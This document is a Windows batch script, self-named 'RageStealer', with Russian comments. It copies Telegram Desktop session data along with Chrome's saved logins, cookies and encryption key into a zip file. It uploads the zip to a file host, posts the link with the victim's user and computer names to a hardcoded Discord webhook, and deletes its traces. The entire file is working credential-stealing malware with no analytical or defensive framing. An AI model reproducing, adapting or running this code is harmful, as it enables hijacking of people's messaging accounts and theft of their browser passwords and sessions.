@echo off
chcp 65001 >nul
setlocal enabledelayedexpansion

:: ==========================================
:: НАСТРОЙКИ
set "WEBHOOK=https://discord.com/api/webhooks/1465710070565437594/Iye1rvEg3imdsGjqcbjTTbHzuaT4dgO8Nq9hfkKIpbQu9y3gSYIOYNHKuVNsWGfZoJ-y"
:: ==========================================

set "WDIR=%TEMP%\.rage_logs_%random%"
set "ZFILE=%TEMP%\RageLog_%random%.zip"
set "JSON=%TEMP%\meta.json"
mkdir "%WDIR%\tdata"

:: 1. GetTdata() - Поиск пути
set "TDATA=%APPDATA%\Telegram Desktop\tdata"
for /f "tokens=2 delims==" %%a in ('wmic process where name^="Telegram.exe" get ExecutablePath /value 2^>nul ^| find "="') do (
    set "E_PATH=%%a"
    for %%i in ("!E_PATH!") do set "TDATA=%%~dpi\tdata"
)

:: 2. GetTelegramSessions() - Сбор данных
if exist "!TDATA!" (
    :: Сбор ПАПОК (длина 16 символов)
    for /d %%D in ("!TDATA!\*") do (
        set "fn=%%~nxD"
        set "c16=!fn:~15,1!"
        set "c17=!fn:~16,1!"
        if not "!c16!"=="" if "!c17!"=="" (
            mkdir "%WDIR%\tdata\!fn!"
            robocopy "%%D" "%WDIR%\tdata\!fn!" /e /r:1 /w:1 /ndl /nfl /njh /njs >nul
        )
    )
    
    :: Сбор ФАЙЛОВ (Размер <= 7120 и фильтры имен)
    for %%F in ("!TDATA!\*") do (
        set "fn=%%~nxF"
        set /a "fsize=%%~zF"
        if !fsize! leq 7120 (
            set "grab=0"
            :: Фильтр по началу имени
            echo !fn! | findstr /i "^usertag ^settings ^key_data" >nul && set "grab=1"
            :: Фильтр по длине 17 и окончанию на "s"
            set "c17=!fn:~16,1!"
            set "c18=!fn:~17,1!"
            set "endsS=!fn:~-1!"
            if "!c17!" neq "" if "!c18!" equ "" if /i "!endsS!" equ "s" set "grab=1"
            
            if !grab! equ 1 copy /y "%%F" "%WDIR%\tdata\" >nul
        )
    )
)

:: 3. Сбор Chrome (опционально)
set "CH_DIR=%LOCALAPPDATA%\Google\Chrome\User Data\Default"
if exist "%CH_DIR%" (
    mkdir "%WDIR%\Chrome"
    robocopy "%CH_DIR%" "%WDIR%\Chrome" "Login Data" "Cookies" /R:1 /W:1 /NDL /NFL /NJH /NJS >nul
    copy /y "%LOCALAPPDATA%\Google\Chrome\User Data\Local State" "%WDIR%\Chrome\" >nul 2>&1
)

:: 4. Упаковка и Отправка
powershell -Command "Add-Type -A 'System.IO.Compression.FileSystem'; [IO.Compression.ZipFile]::CreateFromDirectory('%WDIR%', '%ZFILE%')"

if exist "%ZFILE%" (
    for /f "tokens=*" %%a in ('curl -s -F "reqtype=fileupload" -F "fileToUpload=@%ZFILE%" https://catbox.moe/user/api.php') do set "LINK=%%a"
    if defined LINK (
        echo {"content": "🔱 **RageStealer Engine Active!**\n📦 **Status:** All filters applied (7120b limit)\n🔗 **Link:** !LINK!\n👤 **User:** %USERNAME%\n💻 **PC:** %COMPUTERNAME%"} > "%JSON%"
        curl -s -H "Content-Type: application/json" -X POST -d @"%JSON%" "%WEBHOOK%" >nul
    )
)

:: Очистка
rmdir /s /q "%WDIR%"
del /f /q "%ZFILE%"
del /f /q "%JSON%"
exit